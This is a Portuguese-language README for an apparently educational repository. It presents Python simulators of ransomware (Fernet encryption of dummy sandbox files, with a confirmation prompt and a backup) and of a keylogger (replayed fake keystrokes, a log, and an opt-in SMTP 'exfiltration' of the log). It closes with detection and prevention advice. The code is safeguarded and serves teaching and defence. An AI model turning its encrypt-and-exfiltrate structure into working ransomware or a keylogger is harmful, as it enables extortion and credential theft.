# Ransow-Keylogger_test

## [Descrição](#descrição)

Iremos abordar neste repositorio, a utilização do Python para estruturamento, e conceito e testes em ambiente controlado de ransowares e keyloggers, mostrando contramedidas e formas de prevenção.

## [Aviso Legal](#aviso-legal)

Os codigos escritos e implementados neste readme.md são de total forma educacional e não-destrutiva.
Conforme o conceito de Ethical Hacking, somente aplicar os mesmos em ambientes controlados e V.M's; nunca usando em ambientes de produção.

## Índice
* [Descrição](#descrição)
* [Aviso Legal](#aviso-legal)
* [Pré-requisitos](#pré-requisitos)
* [Configuração do Ambiente](#configuração-do-ambiente)
* [1. Simulador de Ransomware](#ransonware)
* [2. Simulador de Keylogger](#keylogger)
* [Artefatos e suas Localizações](#artefatos-e-suas-localizações)
* [Boas Práticas para Ethical Hacking (Uso)](#boas-práticas-para-ethical-hacking)
* [Detecção e Prevenção de Danos](#detecção-e-prevenção-de-danos)
* **[Estrutura de Branches (Desenvolvimento)](#estrutura-de-branches-desenvolvimento)** <-- NOVO
* 
## [Pré-requisitos](#pré-requisitos)

- Oracle Virtual Box (para emulação do S.O Windows)
  
- Download da IDE para copilação em Python (Iremos utilizar o Pycharm) e download do Python para ter as bibliotecas necessárias
  
- Criação da VM com Windows com o Oracle Virtual Box
  
- Instalação do PyCharm e do Python na V.M do Oracle Virtual Box
  
- Efetuar a codificação e testes não-destrutivos na V.M com Windows.

## [Configuração do Ambiente](#configuração-do-ambiente)

1. Apos download e instalação do Oracle Virtual Box, extrair a .iso's e executar para trazer para a lista de maquinas no Oracle.
2. Configurar o snapshot ao iniciar o primeiro start do sistema operacional.
3. Criar uma conta de e-mail de teste
4. Instale o Python e o sua IDE de preferencia para copilar o código

## [1. Simulador de Ransomware](#ransonware)

### Aplicabilidade

Simular criptografia real apenas nos arquivos criados em sandbox/originals/. O script inclui confirmação manual e faz backup (sandbox/backup_before_encrypt/) antes de sobrescrever.

### Criação do código de criptografia

"""
Simulador de Ransomware com criptografia real *segura* (aplica-se APENAS aos arquivos criados pelo script).

USO SEGURO:
- *Execute somente em VM isolada com snapshot*.
- *Este script opera apenas dentro de ./sandbox/originals/*
- *Antes de criptografar é necessária confirmação manual (digite YES)*.
- *A chave é salva em ./sandbox/chave.key — guarde-a para descriptografar*.

COMPORTAMENTO:
- --prepare: cria arquivos dummy em sandbox/originals/
- --genkey: gera e salva uma chave Fernet em sandbox/chave.key
- --encrypt: criptografa os arquivos em sandbox/originals/ (sobrescreve)
- --decrypt: descriptografa os arquivos em sandbox/originals/ usando a chave em sandbox/chave.key
"""

import argparse
from pathlib import Path
import shutil
import sys
from cryptography.fernet import Fernet

BASE = Path("sandbox")
ORIG = BASE / "originals"
KEYFILE = BASE / "chave.key"
BACKUP = BASE / "backup_before_encrypt"

def ensure_sandbox():
    BASE.mkdir(parents=True, exist_ok=True)
    ORIG.mkdir(parents=True, exist_ok=True)

def prepare_dummy_files(count=5):
    ensure_sandbox()
    for i in range(1, count+1):
        p = ORIG / f"file_{i}.txt"
        if not p.exists():
            p.write_text(f"This is dummy file #{i}\nSafe test file for ransomware simulation.\n")
    print(f"[+] Prepared {count} dummy files at: {ORIG}")

def gen_key(overwrite=False):
    ensure_sandbox()
    if KEYFILE.exists() and not overwrite:
        print(f"[!] Key file already exists at {KEYFILE}. Use --genkey --force to overwrite.")
        return
    key = Fernet.generate_key()
    KEYFILE.write_bytes(key)
    print(f"[+] Generated key and saved to: {KEYFILE}")

def load_key():
    if not KEYFILE.exists():
        raise FileNotFoundError(f"Key file not found at {KEYFILE}. Generate it with --genkey first.")
    return KEYFILE.read_bytes()

def backup_originals():
    """Copia os originais para backup_before_encrypt (para segurança / recuperação manual)"""
    if BACKUP.exists():
        shutil.rmtree(BACKUP)
    shutil.copytree(ORIG, BACKUP)
    print(f"[+] Backup of originals created at: {BACKUP}")

def encrypt_files():
    ensure_sandbox()
    files = [p for p in ORIG.iterdir() if p.is_file()]
    if not files:
        print("[!] No files found in sandbox/originals/ to encrypt. Use --prepare to create dummy files.")
        return
    # confirmação explícita
    print("!!! WARNING !!!")
    print("This operation WILL overwrite files in sandbox/originals/ with their encrypted versions.")
    print("This script is intended for educational use in an isolated VM only.")
    confirm = input("Type YES to proceed (case-sensitive): ")
    if confirm != "YES":
        print("Aborted by user.")
        return

    # backup originals before encrypting (safety)
    backup_originals()

    key = load_key()
    fernet = Fernet(key)
    for p in files:
        data = p.read_bytes()
        enc = fernet.encrypt(data)
        p.write_bytes(enc)
        print(f"[+] Encrypted: {p.name}")
    print("[+] Encryption completed. Keep your chave.key safe to decrypt.")

def decrypt_files():
    ensure_sandbox()
    files = [p for p in ORIG.iterdir() if p.is_file()]
    if not files:
        print("[!] No files found in sandbox/originals/ to decrypt.")
        return
    key = load_key()
    fernet = Fernet(key)
    for p in files:
        enc = p.read_bytes()
        try:
            dec = fernet.decrypt(enc)
        except Exception as e:
            print(f"[!] Failed to decrypt {p.name}: {e}")
            continue
        # restore to file
        p.write_bytes(dec)
        print(f"[+] Decrypted: {p.name}")
    print("[+] Decryption completed.")

def main():
    parser = argparse.ArgumentParser(description="Safe ransomware simulation (Fernet) — sandbox only")
    parser.add_argument("--prepare", action="store_true", help="Create dummy files in sandbox/originals")
    parser.add_argument("--genkey", action="store_true", help="Generate Fernet key and save to sandbox/chave.key")
    parser.add_argument("--force", action="store_true", help="With --genkey, overwrite existing key")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt files in sandbox/originals (requires confirmation)")
    parser.add_argument("--decrypt", action="store_true", help="Decrypt files in sandbox/originals using chave.key")
    parser.add_argument("--count", type=int, default=5, help="Number of dummy files to create with --prepare")
    args = parser.parse_args()

    if args.prepare:
        prepare_dummy_files(count=args.count)

    if args.genkey:
        gen_key(overwrite=args.force)

    if args.encrypt:
        encrypt_files()

    if args.decrypt:
        decrypt_files()

    if not (args.prepare or args.genkey or args.encrypt or args.decrypt):
        parser.print_help()

if __name__ == "__main__":
    main()

### Comportamento

- Backup dos originais em `sandbox/backup_before_encrypt/` antes da criptografia.
  
- Requer digitar `YES` (case-sensitive) para executar `--encrypt`.

- A chave é salva em 'sandbox/chave.key'. **Atenção:** a chave usada pelo simulador **NÃO deve** ser comitada em repositórios públicos nem compartilhada. Mantenha `sandbox/chave.key` em local seguro (offline) e adicione 'sandbox/' ao '.gitignore'.

### Arquivos gerados

- 'sandbox/originals/' — arquivos originais (ou sobrescritos se criptografados)
  
- 'sandbox/backup_before_encrypt/' — cópia dos arquivos antes da encriptação
  
- 'sandbox/chave.key' — chave Fernet (mantenha offline / **não comitar**)

### Flags

python simulators/sim_ransom.py --prepare --count 5   # cria arquivos de teste
python simulators/sim_ransom.py --genkey              # gera chave (sandbox/chave.key)
python simulators/sim_ransom.py --encrypt             # criptografa (requer confirmação YES)
python simulators/sim_ransom.py --decrypt             # descriptografa usando sandbox/chave.key

[2. Simulador de Keylogger](#keylogger)

### Aplicabilidade

Demonstrar ciclo de um keylogger sem capturar teclas furtivas — replay a partir de sandbox/input_simulated_keystrokes.txt, logging em sandbox/log.txt e preview de exfiltração.

### Criação do código de criptografia

"""
sim_keylogger_simple_simulator.py — Simulador simples e seguro de keylogger (educacional)

Modos:
  --simulate         : Reproduz entradas do arquivo sandbox/input_simulated_keystrokes.txt
  --interactive      : Usuário digita linhas manualmente (consentimento explícito)
  --preview-email    : Gera sandbox/outgoing_email_preview.txt com payload (não envia)
  --send-email       : Tenta enviar o payload por SMTP, mas apenas se explicitamente permitido
  --write-smtp-tpl   : Gera um template sandbox/smtp_config.json (edite para testar envio)

ATENÇÃO:
 - NÃO captura teclas furtivas.
 - NÃO envia nada sem configuração explícita e consentimento.
 - Use somente em VM/ambiente isolado para demonstrações.
"""

import argparse
import os
import json
import time
from datetime import datetime
from pathlib import Path
import smtplib
from email.mime.text import MIMEText

# Paths
BASE = Path("sandbox")
SIM_INPUT = BASE / "input_simulated_keystrokes.txt"
LOG_FILE = BASE / "log.txt"
OUTGOING_PREVIEW = BASE / "outgoing_email_preview.txt"
SMTP_CFG = BASE / "smtp_config.json"

# Teclas a "ignorar" (apenas conceitual aqui)
IGNORAR = {
    "shift", "ctrl", "alt", "caps_lock", "cmd"
}

def ensure_sandbox():
    BASE.mkdir(parents=True, exist_ok=True)

def now_ts():
    return datetime.utcnow().isoformat() + "Z"

def create_sim_input():
    if not SIM_INPUT.exists():
        SIM_INPUT.write_text(
            "hello world\n"
            "this is a simulated typing session\n"
            "username: alice@example.com password: example\n"
        )
        print(f"[+] Created simulated input at: {SIM_INPUT.resolve()}")

def append_log(text):
    ensure_sandbox()
    with LOG_FILE.open("a", encoding="utf-8") as f:
        f.write(text)
    print(f"[+] Wrote to log: {text.strip()}")

def simulate_mode(delay=0.3):
    """Replay lines from simulated input into log with timestamps."""
    ensure_sandbox()
    create_sim_input()
    with SIM_INPUT.open("r", encoding="utf-8") as src:
        for line in src:
            ts = now_ts()
            append_log(f"{ts}  {line}")
            time.sleep(delay)
    print(f"[+] Simulation complete. Log at: {LOG_FILE.resolve()}")

def interactive_mode():
    """Let user type lines which will be logged (explicit consent)."""
    ensure_sandbox()
    print("Type lines to log (empty line to finish). You are consenting to record these lines.")
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line == "":
            break
        ts = now_ts()
        # emulate the small mapping from your example: spaces/newlines preserved
        append_log(f"{ts}  {line}\n")
    print(f"[+] Interactive logging done. Log at: {LOG_FILE.resolve()}")

def preview_email():
    """Create a preview file with what would be sent by email."""
    ensure_sandbox()
    payload = LOG_FILE.read_text(encoding="utf-8") if LOG_FILE.exists() else "(no logs)"
    OUTGOING_PREVIEW.write_text(f"SIMULATED EXFILTRATION PREVIEW\nGenerated: {now_ts()}\n\n{payload}")
    print(f"[+] Outgoing preview written to: {OUTGOING_PREVIEW.resolve()}")

def write_smtp_template():
    ensure_sandbox()
    sample = {
        "host": "smtp.example.com",
        "port": 587,
        "username": "user@example.com",
        "password": "yourpassword",
        "from_addr": "user@example.com",
        "to_addr": "recipient@example.com",
        "starttls": True,
        "confirm_send": False
    }
    SMTP_CFG.write_text(json.dumps(sample, indent=2))
    print(f"[+] SMTP template written to: {SMTP_CFG.resolve()}")
    print("[!] Edit sandbox/smtp_config.json and set confirm_send=true OR set env ALLOW_KEYLOGGER_SEND=1 to permit sending.")

def load_smtp_config():
    if not SMTP_CFG.exists():
        return None
    try:
        cfg = json.loads(SMTP_CFG.read_text(encoding="utf-8"))
        return cfg
    except Exception as e:
        print(f"[!] Failed to read smtp config: {e}")
        return None

def send_email_if_allowed():
    cfg = load_smtp_config()
    if cfg is None:
        print("[!] No smtp_config.json found — create one with --write-smtp-tpl to enable sending.")
        return False
    env = os.environ.get("ALLOW_KEYLOGGER_SEND", "")
    if env != "1" and not cfg.get("confirm_send", False):
        print("[!] Sending blocked: set ALLOW_KEYLOGGER_SEND=1 or set confirm_send=true in smtp_config.json")
        return False
    # prepare payload
    payload = LOG_FILE.read_text(encoding="utf-8") if LOG_FILE.exists() else "(no logs)"
    msg = MIMEText(payload)
    msg["Subject"] = f"Simulated Keylogger Data - {now_ts()}"
    msg["From"] = cfg.get("from_addr")
    msg["To"] = cfg.get("to_addr")
    try:
        server = smtplib.SMTP(cfg["host"], int(cfg["port"]), timeout=20)
        if cfg.get("starttls", True):
            server.starttls()
        server.login(cfg["username"], cfg["password"])
        server.send_message(msg)
        server.quit()
        print("[+] Email sent (in simulation mode).")
        return True
    except Exception as e:
        print(f"[!] SMTP send failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Simple safe keylogger simulator (educational).")
    parser.add_argument("--simulate", action="store_true", help="Replay simulated keystrokes into the log")
    parser.add_argument("--interactive", action="store_true", help="Type lines that will be logged (consent)")
    parser.add_argument("--preview-email", action="store_true", help="Create preview of exfil payload (no network)")
    parser.add_argument("--send-email", action="store_true", help="Attempt to send log via SMTP if explicitly allowed")
    parser.add_argument("--write-smtp-tpl", action="store_true", help="Write sandbox/smtp_config.json template")
    parser.add_argument("--delay", type=float, default=0.3, help="Delay between replayed lines")
    args = parser.parse_args()

    if not (args.simulate or args.interactive or args.preview_email or args.send_email or args.write_smtp_tpl):
        parser.print_help()
        return

    if args.write_smtp_tpl:
        write_smtp_template()

    if args.simulate:
        simulate_mode(delay=args.delay)

    if args.interactive:
        interactive_mode()

    if args.preview_email:
        preview_email()

    if args.send_email:
        send_email_if_allowed()

if __name__ == "__main__":
    main()


### Comportamento

Não captura entradas do sistema.

Envio SMTP bloqueado por padrão; precisa ALLOW_KEYLOGGER_SEND=1 ou confirm_send=true no smtp_config.json.

### Arquivos gerados

sandbox/input_simulated_keystrokes.txt — arquivo de entrada simulado (gerado automaticamente se ausente)

sandbox/log.txt — log com timestamps

sandbox/outgoing_email_preview.txt — preview do que seria exfiltrado

sandbox/smtp_config.json — template SMTP (se gerado)

### Flags

python simulators/sim_keylogger_simple_simulator.py --simulate      # replay dos keystrokes simulados
python simulators/sim_keylogger_simple_simulator.py --interactive   # digitação com consentimento
python simulators/sim_keylogger_simple_simulator.py --preview-email # gera preview do payload (sem enviar)
python simulators/sim_keylogger_simple_simulator.py --write-smtp-tpl # cria sandbox/smtp_config.json

[Artefatos e suas Localizações](#artefatos-e-suas-localizações)

Após execução, verifique:

sandbox/ — pasta principal dos artefatos (sempre no repo local/VM)

sandbox/originals/, sandbox/backup_before_encrypt/, sandbox/chave.key (ransomware)

sandbox/log.txt, sandbox/outgoing_email_preview.txt, sandbox/smtp_config.json (keylogger)

[Boas Práticas para Ethical Hacking (Uso)](#boas-práticas-para-ethical-hacking)

- Executar somente em VM isolada e criar snapshot (snapshot criado).

- Desconectar VM da rede ou usar rede de laboratório.

- Verificar que sandbox/ está no .gitignore.

- NUNCA comitar sandbox/chave.key, sandbox/log.txt ou sandbox/smtp_config.json com credenciais.

- Fazer backup/snapshot antes e depois dos testes.

- Documentar execução (prints, comandos, hashes dos artefatos).

[Detecção e Prevenção de Danos](#detecção-e-prevenção-de-danos)

### Como identificar atividades suspeitas:

Muitos arquivos sendo criados ou modificados rapidamente.

Arquivos com novas extensões estranhas (ex: .enc, .locked).

Aparecimento de mensagens de “resgate” como README_RESCUE.txt.

Programas tentando enviar e-mails ou se conectar à internet logo após criptografar algo.

### Como se proteger e evitar danos:

Mantenha backups offline e testados regularmente.

Use antivírus ou EDR com detecção comportamental.

Evite dar permissões de administrador a programas desnecessários.

Bloqueie macros e scripts desconhecidos.

Separe a rede em partes (segmentação) para limitar propagação.

Treine os usuários para reconhecer phishing e anexos maliciosos.

### O que fazer em caso de ataque:

Desconecte o computador da rede imediatamente.

Guarde evidências (logs, memória, prints, arquivos afetados).

Descubra o alcance do ataque — quais máquinas e dados foram afetados.

Restaure os arquivos usando backups confiáveis.

Corrija a falha que permitiu o ataque e registre o aprendizado.

